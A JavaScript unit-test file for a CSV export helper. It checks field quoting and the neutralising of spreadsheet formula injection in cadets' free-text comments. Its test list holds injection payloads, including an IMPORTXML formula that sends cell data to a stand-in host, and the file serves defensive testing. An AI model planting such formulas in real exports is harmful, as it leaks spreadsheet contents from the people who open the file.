/**
 * CSV export: escaping, and what a cadet can put in a spreadsheet.
 *
 *     npm run test:unit
 *
 * `toCsv` is the escaping layer under every export in the app — responses,
 * the roster, the activity log. Its input is the least controlled text in the
 * product: a cadet's free-text answer, typed on a phone, read later by a cadre
 * member in Excel or Google Sheets.
 *
 * Two separate jobs, and only one of them is about the file being well-formed:
 *
 *   - **Structure.** A comma, a quote or a newline inside an answer must not
 *     become a new column or a new row. RFC 4180 quoting, which this already did.
 *   - **What the spreadsheet does with it.** A value beginning `=`, `+`, `-` or
 *     `@` is a formula, not text. Quoting does not stop that — the quotes are
 *     stripped on import and the formula runs. In Sheets it can reach the
 *     network. The person it runs as is the cadre member reading feedback about
 *     themselves, which is the whole audience of this file.
 */

import { toCsv } from '../../js/util.js';

let failures = 0;
const check = (label, fn) => {
  try { fn(); console.log(`  ok   ${label}`); }
  catch (err) { console.log(`  FAIL ${label}: ${err.message}`); failures++; }
};

const COLS = [{ key: 'name', label: 'name' }, { key: 'comment', label: 'comment' }];
const rowsOf = (csv) => csv.split('\r\n');
const one = (comment) => rowsOf(toCsv([{ name: 'Alvarez, Mia', comment }], COLS))[1];

/**
 * Splits one CSV record into its fields, unquoting as it goes.
 *
 * Written out rather than `line.split(',')`, because the name column here
 * deliberately contains a comma — splitting naively finds it and tests the wrong
 * field, which is how the first draft of this file reported passes it had not
 * earned.
 */
function fields(line) {
  const out = [];
  let value = '';
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (quoted) {
      if (c === '"') {
        if (line[i + 1] === '"') { value += '"'; i++; } else quoted = false;
      } else value += c;
    } else if (c === '"') quoted = true;
    else if (c === ',') { out.push(value); value = ''; }
    else value += c;
  }
  out.push(value);
  return out;
}

const commentOf = (comment) => fields(one(comment))[1];

/* ---------- structure ---------- */

check('a comma in a value does not become a new column', () => {
  const line = one('good, but long');
  if (line !== '"Alvarez, Mia","good, but long"') throw new Error(line);
});

check('a quote is doubled and the value wrapped', () => {
  const line = one('he said "fine"');
  if (line !== '"Alvarez, Mia","he said ""fine"""') throw new Error(line);
});

check('a newline stays inside one record', () => {
  const csv = toCsv([{ name: 'X', comment: 'line one\nline two' }], COLS);
  // Three physical lines, two records: the embedded newline is inside quotes.
  if (rowsOf(csv).length !== 2) throw new Error(`split into ${rowsOf(csv).length} records`);
  if (!csv.includes('"line one\nline two"')) throw new Error(csv);
});

check('null and undefined become empty, not the words', () => {
  const line = rowsOf(toCsv([{ name: null, comment: undefined }], COLS))[1];
  if (line !== ',') throw new Error(line);
});

check('a header label is escaped like any other value', () => {
  const csv = toCsv([], [{ key: 'a', label: 'first, last' }]);
  if (csv !== '"first, last"') throw new Error(csv);
});

/* ---------- formula injection ---------- */

const INJECTIONS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=IMPORTXML("https://example.test/?x="&A1,"//a")',
  '=HYPERLINK("https://example.test","click")',
];

for (const payload of INJECTIONS) {
  check(`a comment beginning "${payload.slice(0, 12)}" is not left as a formula`, () => {
    const inner = commentOf(payload);
    if (/^[=+\-@]/.test(inner)) {
      throw new Error(`reaches the spreadsheet as a formula: ${inner}`);
    }
    // The text must still be readable — neutralising it by deleting it is not a fix.
    if (!inner.includes(payload.replace(/^[=+\-@]/, ''))) {
      throw new Error(`the comment was mangled beyond reading: ${inner}`);
    }
  });
}

check('an ordinary value is not given a prefix it does not need', () => {
  const line = one('clear and useful feedback');
  if (line !== '"Alvarez, Mia",clear and useful feedback') throw new Error(line);
});

check('a negative number is still a number', () => {
  // -3 is a value a scale question can produce; it must not be mistaken for a
  // formula and prefixed, or every numeric export becomes text.
  const line = rowsOf(toCsv([{ name: 'X', comment: -3 }], COLS))[1];
  if (line !== 'X,-3') throw new Error(line);
});

console.log(failures ? `\n${failures} CSV check(s) failed.` : '\nCSV exports are safe to open.');
process.exit(failures ? 1 : 0);
